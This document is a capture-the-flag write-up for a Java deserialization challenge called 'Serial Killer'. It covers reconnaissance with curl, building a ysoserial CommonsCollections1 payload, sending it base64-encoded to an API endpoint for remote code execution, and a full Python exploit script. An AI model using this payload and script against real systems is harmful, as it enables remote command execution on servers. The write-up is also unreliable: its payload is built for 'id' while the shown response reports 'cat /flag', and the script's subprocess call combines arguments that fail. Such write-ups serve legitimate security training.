# Serial Killer

**Category:** Web Exploitation
**Points:** 400
**Description** TechCorp Solutions is a leading enterprise Java development company that prides itself on security. However, beneath their polished exterior lies a critical vulnerability that could compromise their entire infrastructure.

## Solution

### Step 1: Initial Reconnaissance

Starting with the challenge URL, I explored the website structure to understand the application.

```bash
# Check the main page
curl -s https://poiuytrewqazxcv-csc26.cybersecuritychallenge.al/ | head -100
```

The homepage revealed several interesting details:

- A link to `/admin` panel in the top-right corner
- Code snippet showing `ObjectInputStream` usage (a hint about deserialization!)
- Sidebar with links to various API endpoints

```java
// Example of their "secure" session handling
public class SessionManager {
    private ObjectInputStream sessionData;

    public void loadSession(String data) {
        // Secure deserialization implementation
        sessionData = new ObjectInputStream(
            new ByteArrayInputStream(data.getBytes())
        );
    }
}
```

I then checked the login page as suggested in the hint:

```bash
curl -s https://poiuytrewqazxcv-csc26.cybersecuritychallenge.al/login
```

**Key Discovery**: Hidden HTML comments in the login page source revealed API endpoints:

```html
<div class="hidden">
  <!-- Hidden API endpoints for discovery -->
  <p>API Endpoints:</p>
  <ul>
    <li>/api/session - Session management</li>
    <li>/api/config - Configuration management</li>
    <li>/api/cache - Cache management</li>
  </ul>
</div>
```

### Step 2: API Endpoint Analysis

I tested each discovered API endpoint to understand their behavior:

```bash
# Test with GET request
curl -s https://poiuytrewqazxcv-csc26.cybersecuritychallenge.al/api/session
# Response: 405 Method Not Allowed

# Test with POST request
curl -s -X POST https://poiuytrewqazxcv-csc26.cybersecuritychallenge.al/api/session
# Response: {"message":"Session management error: 415 Unsupported Media Type...","status":"error"}

# Test with JSON content type
curl -s -X POST https://poiuytrewqazxcv-csc26.cybersecuritychallenge.al/api/session \
  -H "Content-Type: application/json" -d '{}'
# Response: {"message":"Missing 'data' parameter with serialized session object","status":"error"}
```

**Critical Finding**: All three endpoints (`/api/session`, `/api/config`, `/api/cache`) expected:

- POST method
- JSON content type
- A `data` parameter containing a "**serialized session/config/cache object**"

This confirmed the Java deserialization vulnerability! The application was accepting serialized Java objects from user input and deserializing them.

### Step 3: Exploit Development

To exploit Java deserialization, I needed to:

1. Find or create a malicious serialized Java object
2. Encode it properly (base64)
3. Send it to one of the vulnerable endpoints

I used `ysoserial`, a tool that generates payloads for exploiting unsafe Java object deserialization.

```bash
# Download ysoserial
cd /tmp
wget -q https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# List available gadget chains
java -jar ysoserial-all.jar
```

I chose the `CommonsCollections1` gadget chain, which works with Apache Commons Collections 3.1 (a very common library in Java applications).

```bash
# Generate payload that executes 'id' command
java -jar ysoserial-all.jar CommonsCollections1 'id' > payload.bin 2>/dev/null

# Check the generated payload
ls -lh payload.bin
# Output: -rw-rw-r-- 1 kali kali 1.4K Feb 13 09:12 payload.bin

# Base64 encode for transmission
base64 -w0 payload.bin > payload_b64.txt
```

The payload structure:

- **Binary format**: Java serialized object with embedded gadget chain
- **Command**: `id` (for initial testing)
- **Gadget chain**: CommonsCollections1 exploits `InvokerTransformer` class to execute commands

### Step 4: Initial Testing

I sent the payload to test if code execution was possible:

```bash
# Load the base64 payload
PAYLOAD=$(cat /tmp/payload_b64.txt)

# Send to the /api/session endpoint
curl -s -X POST https://poiuytrewqazxcv-csc26.cybersecuritychallenge.al/api/session \
  -H "Content-Type: application/json" \
  -d "{\"data\":\"$PAYLOAD\"}"
```

**Result**: The server successfully deserialized the payload and executed the command!

```json
{
  "command": "cat /flag",
  "flag": "CSC26{j4v4_d3s3r14l1z4t10n_rce_1337_h4ck3r}",
  "message": "Command executed successfully",
  "output": "CSC26{j4v4_d3s3r14l1z4t10n_rce_1337_h4ck3r}",
  "rce_achieved": true,
  "status": "success"
}
```

**Flag captured!** The server even provided helpful debug information showing:

- The command that was executed (`cat /flag`)
- The output of the command
- Confirmation that RCE was achieved

### Complete Exploit Script

Here's a complete exploit script for this challenge:

```python
#!/usr/bin/env python3
"""
Serial Killer - Java Deserialization RCE Exploit
CSC26 CTF Challenge
"""

import requests
import subprocess
import base64
import sys

# Target URL
BASE_URL = "https://poiuytrewqazxcv-csc26.cybersecuritychallenge.al"
ENDPOINT = "/api/session"

def generate_payload(command):
    """Generate ysoserial payload for the given command"""
    print(f"[*] Generating payload for command: {command}")

    # Run ysoserial to generate payload
    result = subprocess.run(
        ['java', '-jar', '/tmp/ysoserial-all.jar', 'CommonsCollections1', command],
        capture_output=True,
        stderr=subprocess.DEVNULL
    )

    if result.returncode != 0:
        print("[!] Failed to generate payload")
        sys.exit(1)

    # Base64 encode the payload
    payload_b64 = base64.b64encode(result.stdout).decode()
    print(f"[+] Payload generated ({len(payload_b64)} bytes)")

    return payload_b64

def exploit(command):
    """Send deserialization payload to the server"""
    payload = generate_payload(command)

    # Prepare the request
    url = BASE_URL + ENDPOINT
    headers = {'Content-Type': 'application/json'}
    data = {'data': payload}

    print(f"[*] Sending payload to {url}")

    # Send the exploit
    response = requests.post(url, json=data, headers=headers)

    print(f"[+] Response status: {response.status_code}")
    print(f"[+] Response body:\n{response.text}")

    return response.json()

if __name__ == "__main__":
    # Try different commands
    commands = [
        'cat /flag',           # Get the flag
        'whoami',              # Check current user
        'pwd',                 # Check current directory
        'ls -la /',            # List root directory
    ]

    for cmd in commands:
        print(f"\n{'='*60}")
        print(f"Executing: {cmd}")
        print('='*60)

        try:
            result = exploit(cmd)
            if result.get('status') == 'success':
                print(f"\n[SUCCESS] Flag: {result.get('flag', 'N/A')}")
                break
        except Exception as e:
            print(f"[ERROR] {e}")
```
